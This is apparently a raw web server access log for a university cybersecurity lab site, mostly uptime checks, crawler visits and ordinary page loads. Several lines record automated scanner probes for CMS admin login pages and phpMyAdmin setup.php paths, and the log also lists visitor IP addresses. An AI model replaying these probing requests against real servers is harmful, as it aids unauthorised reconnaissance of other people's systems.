104.238.136.194 - - [23/Sep/2020:11:15:46 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:9002:11a::1 - - [23/Sep/2020:11:15:46 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.76.104.117 - - [23/Sep/2020:11:20:44 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:7001:45a::1 - - [23/Sep/2020:11:20:44 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
104.238.136.194 - - [23/Sep/2020:11:25:43 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:9002:11a::1 - - [23/Sep/2020:11:25:43 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
193.239.147.184 - - [23/Sep/2020:11:28:32 +0000] "HEAD / HTTP/1.0" 301 0 "-" "-"
2001:19f0:6c01:145::1 - - [23/Sep/2020:11:30:40 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
104.238.159.87 - - [23/Sep/2020:11:30:40 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
66.249.79.245 - - [23/Sep/2020:11:34:36 +0000] "GET /resources/lab-network-hardware HTTP/1.1" 200 10594 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
2001:19f0:4400:402e::1 - - [23/Sep/2020:11:35:40 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.32.107.181 - - [23/Sep/2020:11:35:40 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
77.88.5.7 - - [23/Sep/2020:11:38:07 +0000] "GET /robots.txt HTTP/1.1" 200 197 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.5.7 - - [23/Sep/2020:11:38:10 +0000] "GET /resources/reverse-engineering-malware-toolkits HTTP/1.1" 200 11071 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
185.191.171.33 - - [23/Sep/2020:11:38:55 +0000] "GET /robots.txt HTTP/1.1" 200 197 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.17 - - [23/Sep/2020:11:38:55 +0000] "GET /courses/cybr200/archive_2017_fall/projects/project1 HTTP/1.1" 200 13996 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.19 - - [23/Sep/2020:11:39:00 +0000] "GET /courses HTTP/1.1" 200 9707 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
66.249.79.234 - - [23/Sep/2020:11:39:58 +0000] "GET / HTTP/1.1" 301 194 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.245 - - [23/Sep/2020:11:39:59 +0000] "GET / HTTP/1.1" 200 9874 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
104.238.159.87 - - [23/Sep/2020:11:40:39 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:6c01:145::1 - - [23/Sep/2020:11:40:39 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
66.249.79.247 - - [23/Sep/2020:11:41:44 +0000] "GET /resources/lab-network-hardware-console HTTP/1.1" 200 9995 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.247 - - [23/Sep/2020:11:42:01 +0000] "GET /courses/comp293a/resources/10-anti-re.pdf HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.245 - - [23/Sep/2020:11:43:48 +0000] "GET /courses/comp293a/labs/lab-8-anti-re HTTP/1.1" 200 15666 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.32.74.41 - - [23/Sep/2020:11:45:36 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:6001:2c6::1 - - [23/Sep/2020:11:45:36 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
66.249.79.243 - - [23/Sep/2020:11:48:49 +0000] "GET /courses/comp293a/resources/11-anti-re-2.pdf HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.245 - - [23/Sep/2020:11:50:24 +0000] "GET /courses/comp293a/labs/lab-6-disassemblers-and-debuggers HTTP/1.1" 200 11658 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.245 - - [23/Sep/2020:11:50:33 +0000] "GET /resources/reverse-engineering-cheat-sheets HTTP/1.1" 200 9030 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
192.99.37.47 - - [23/Sep/2020:11:50:35 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2607:5300:60:4c2f::1 - - [23/Sep/2020:11:50:35 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
185.191.171.18 - - [23/Sep/2020:11:55:05 +0000] "GET /courses/cybr200/labs HTTP/1.1" 200 8887 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
2001:19f0:9002:11a::1 - - [23/Sep/2020:11:55:34 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
104.238.136.194 - - [23/Sep/2020:11:55:34 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.63.29.207 - - [23/Sep/2020:12:00:34 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:5801:1d8::1 - - [23/Sep/2020:12:00:34 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
47.99.197.123 - - [23/Sep/2020:12:02:49 +0000] "HEAD /caiyuan/login.php HTTP/1.1" 301 0 "-" "-"
47.99.197.123 - - [23/Sep/2020:12:02:49 +0000] "HEAD /dede/login.php HTTP/1.1" 301 0 "-" "-"
47.99.197.123 - - [23/Sep/2020:12:02:49 +0000] "HEAD /admin/login.php HTTP/1.1" 301 0 "-" "-"
47.99.197.123 - - [23/Sep/2020:12:02:49 +0000] "HEAD /jian/login.php HTTP/1.1" 301 0 "-" "-"
47.99.197.123 - - [23/Sep/2020:12:02:49 +0000] "HEAD /dede123/login.php HTTP/1.1" 301 0 "-" "-"
47.99.197.123 - - [23/Sep/2020:12:02:49 +0000] "HEAD /wang/login.php HTTP/1.1" 301 0 "-" "-"
47.99.197.123 - - [23/Sep/2020:12:02:50 +0000] "HEAD /guanli/login.php HTTP/1.1" 301 0 "-" "-"
47.99.197.123 - - [23/Sep/2020:12:02:50 +0000] "HEAD /dedea/login.php HTTP/1.1" 301 0 "-" "-"
47.99.197.123 - - [23/Sep/2020:12:02:50 +0000] "HEAD /houtai/login.php HTTP/1.1" 301 0 "-" "-"
37.230.176.57 - - [23/Sep/2020:12:05:14 +0000] "GET /resources/lab-network-hardware-console HTTP/1.1" 200 9995 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:14 +0000] "GET /assets/f34339a9d26808defc965517fd93f714.css HTTP/1.1" 200 155416 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:15 +0000] "GET /user/plugins/lightslider/js/lightslider.min.js HTTP/1.1" 200 16018 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:15 +0000] "GET /system/assets/jquery/jquery-2.x.min.js HTTP/1.1" 200 85578 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:15 +0000] "GET /user/plugins/featherlight/js/featherlight.min.js HTTP/1.1" 200 8670 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:15 +0000] "GET /user/plugins/gantry5/assets/js/main.js HTTP/1.1" 200 60610 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:15 +0000] "GET /user/plugins/highlight/js/highlight.pack.js HTTP/1.1" 200 101421 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:15 +0000] "GET /user/plugins/simplesearch/js/simplesearch.js HTTP/1.1" 200 1277 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:16 +0000] "GET /user/themes/g5_helium/fonts/raleway/raleway-regular/raleway-regular-webfont.woff2?5f593174 HTTP/1.1" 200 25424 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:16 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-bold/lato-bold-webfont.woff2?5f593174 HTTP/1.1" 200 25608 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:16 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-regular/lato-regular-webfont.woff2?5f593174 HTTP/1.1" 200 25040 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:16 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-black/lato-black-webfont.woff2?5f593174 HTTP/1.1" 200 24632 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:16 +0000] "GET /user/plugins/gantry5/assets/fonts/fontawesome-webfont.woff2?v=4.7.0 HTTP/1.1" 200 77160 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:16 +0000] "GET /user/themes/g5_helium/fonts/raleway/raleway-bold/raleway-bold-webfont.woff2?5f593174 HTTP/1.1" 200 25368 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
37.230.176.57 - - [23/Sep/2020:12:05:17 +0000] "GET /user/images/g5_helium/favicon.ico HTTP/1.1" 200 5430 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
2001:19f0:7001:45a::1 - - [23/Sep/2020:12:05:33 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.76.104.117 - - [23/Sep/2020:12:05:33 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
104.238.136.194 - - [23/Sep/2020:12:10:33 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:9002:11a::1 - - [23/Sep/2020:12:10:33 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
77.88.5.7 - - [23/Sep/2020:12:12:26 +0000] "GET /courses/comp178/resources/03-penetration-testing-reconnaissance.pdf HTTP/1.1" 200 337783 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.79.247 - - [23/Sep/2020:12:15:01 +0000] "GET /resources/reverse-engineering-malware-toolkits HTTP/1.1" 200 11071 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
192.99.37.47 - - [23/Sep/2020:12:15:31 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2607:5300:60:4c2f::1 - - [23/Sep/2020:12:15:31 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
79.137.28.20 - - [23/Sep/2020:12:17:34 +0000] "GET /resources/lab-network-hardware-console HTTP/1.1" 200 10002 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:35 +0000] "GET /user/plugins/lightslider/js/lightslider.min.js HTTP/1.1" 200 16018 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:35 +0000] "GET /assets/f34339a9d26808defc965517fd93f714.css HTTP/1.1" 200 155416 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:35 +0000] "GET /system/assets/jquery/jquery-2.x.min.js HTTP/1.1" 200 85578 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:35 +0000] "GET /user/plugins/featherlight/js/featherlight.min.js HTTP/1.1" 200 8670 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:35 +0000] "GET /user/plugins/simplesearch/js/simplesearch.js HTTP/1.1" 200 1277 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:35 +0000] "GET /user/plugins/highlight/js/highlight.pack.js HTTP/1.1" 200 101421 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:35 +0000] "GET /user/plugins/gantry5/assets/js/main.js HTTP/1.1" 200 60610 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:36 +0000] "GET /user/themes/g5_helium/fonts/raleway/raleway-regular/raleway-regular-webfont.woff2?5f593174 HTTP/1.1" 200 25424 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:36 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-bold/lato-bold-webfont.woff2?5f593174 HTTP/1.1" 200 25608 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:36 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-black/lato-black-webfont.woff2?5f593174 HTTP/1.1" 200 24632 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:36 +0000] "GET /user/themes/g5_helium/fonts/raleway/raleway-bold/raleway-bold-webfont.woff2?5f593174 HTTP/1.1" 200 25368 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:36 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-regular/lato-regular-webfont.woff2?5f593174 HTTP/1.1" 200 25040 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:36 +0000] "GET /user/plugins/gantry5/assets/fonts/fontawesome-webfont.woff2?v=4.7.0 HTTP/1.1" 200 77160 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
79.137.28.20 - - [23/Sep/2020:12:17:37 +0000] "GET /user/images/g5_helium/favicon.ico HTTP/1.1" 200 5430 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
77.88.5.7 - - [23/Sep/2020:12:18:06 +0000] "GET /courses/cybr230/resources/07-802.11.pdf HTTP/1.1" 200 40021231 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
45.32.107.181 - - [23/Sep/2020:12:20:30 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:4400:402e::1 - - [23/Sep/2020:12:20:32 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
66.249.79.247 - - [23/Sep/2020:12:20:42 +0000] "GET /resources/lab-network-monitoring HTTP/1.1" 200 12017 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.247 - - [23/Sep/2020:12:23:13 +0000] "GET /courses/comp178/projects/presentation-1 HTTP/1.1" 200 11595 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.245 - - [23/Sep/2020:12:23:46 +0000] "GET /courses/comp293a/labs/lab-9-anti-re-2 HTTP/1.1" 200 14612 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
2.57.122.212 - - [23/Sep/2020:12:24:31 +0000] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 152 "-" "ZmEu"
2.57.122.212 - - [23/Sep/2020:12:24:31 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
2.57.122.212 - - [23/Sep/2020:12:24:32 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
2.57.122.212 - - [23/Sep/2020:12:24:32 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
2.57.122.212 - - [23/Sep/2020:12:24:33 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
2.57.122.212 - - [23/Sep/2020:12:24:33 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
45.63.29.207 - - [23/Sep/2020:12:25:28 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:5801:1d8::1 - - [23/Sep/2020:12:25:28 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:6c01:145::1 - - [23/Sep/2020:12:30:26 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
104.238.159.87 - - [23/Sep/2020:12:30:26 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
91.216.204.158 - - [23/Sep/2020:12:31:55 +0000] "GET /resources/lab-network-hardware-console HTTP/1.1" 200 9995 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:55 +0000] "GET /assets/f34339a9d26808defc965517fd93f714.css HTTP/1.1" 200 155416 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:55 +0000] "GET /system/assets/jquery/jquery-2.x.min.js HTTP/1.1" 200 85578 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:55 +0000] "GET /user/plugins/lightslider/js/lightslider.min.js HTTP/1.1" 200 16018 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:55 +0000] "GET /user/plugins/highlight/js/highlight.pack.js HTTP/1.1" 200 101421 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:55 +0000] "GET /user/plugins/featherlight/js/featherlight.min.js HTTP/1.1" 200 8670 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:55 +0000] "GET /user/plugins/gantry5/assets/js/main.js HTTP/1.1" 200 60610 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:56 +0000] "GET /user/plugins/simplesearch/js/simplesearch.js HTTP/1.1" 200 1277 "https://cyberlab.pacific.edu/resources/lab-network-hardware-console" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:56 +0000] "GET /user/themes/g5_helium/fonts/raleway/raleway-regular/raleway-regular-webfont.woff2?5f593174 HTTP/1.1" 200 25424 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:56 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-bold/lato-bold-webfont.woff2?5f593174 HTTP/1.1" 200 25608 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:56 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-black/lato-black-webfont.woff2?5f593174 HTTP/1.1" 200 24632 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:56 +0000] "GET /user/themes/g5_helium/fonts/raleway/raleway-bold/raleway-bold-webfont.woff2?5f593174 HTTP/1.1" 200 25368 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:56 +0000] "GET /user/plugins/gantry5/assets/fonts/fontawesome-webfont.woff2?v=4.7.0 HTTP/1.1" 200 77160 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:56 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-regular/lato-regular-webfont.woff2?5f593174 HTTP/1.1" 200 25040 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:31:56 +0000] "GET /user/images/g5_helium/favicon.ico HTTP/1.1" 200 5430 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
91.216.204.158 - - [23/Sep/2020:12:32:32 +0000] "GET /favicon.ico HTTP/1.1" 404 8699 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
2001:19f0:4400:402e::1 - - [23/Sep/2020:12:35:25 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.32.107.181 - - [23/Sep/2020:12:35:25 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:7001:45a::1 - - [23/Sep/2020:12:40:22 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.76.104.117 - - [23/Sep/2020:12:40:22 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
83.97.20.30 - - [23/Sep/2020:12:44:46 +0000] "GET / HTTP/1.1" 200 44683 "-" "-"
45.32.74.41 - - [23/Sep/2020:12:45:19 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:6001:2c6::1 - - [23/Sep/2020:12:45:19 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
